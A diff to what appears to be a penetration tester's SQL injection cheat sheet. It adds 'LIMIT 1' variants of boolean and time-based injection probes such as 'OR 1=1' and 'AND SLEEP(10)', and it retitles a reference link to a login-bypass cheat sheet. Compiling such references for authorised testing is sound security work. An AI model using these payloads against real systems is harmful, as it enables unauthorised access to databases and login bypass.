@@ -64,12 +64,18 @@ AND ('abc'='abc
 
 ```
 OR 1=1
+OR 1=1 LIMIT 1
 OR '1'='1'
+OR '1'='1' LIMIT 1
 OR 1=2
+OR 1=2 LIMIT 1
 OR SLEEP(10)
 AND 1=1
+AND 1=1 LIMIT 1
 AND '1'='1'
+AND '1'='1' LIMIT 1
 AND 1=2
+AND 1=2 LIMIT 1
 AND SLEEP(10)
 ```
 
@@ -214,7 +220,7 @@ c:\wamp\www
 
 - [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection)
 
-- [PentestLab: SQL Injection Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+- [Pentestlab Blog: SQL Injection Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
 
 - [Hacktricks: SQL Login Bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)
 
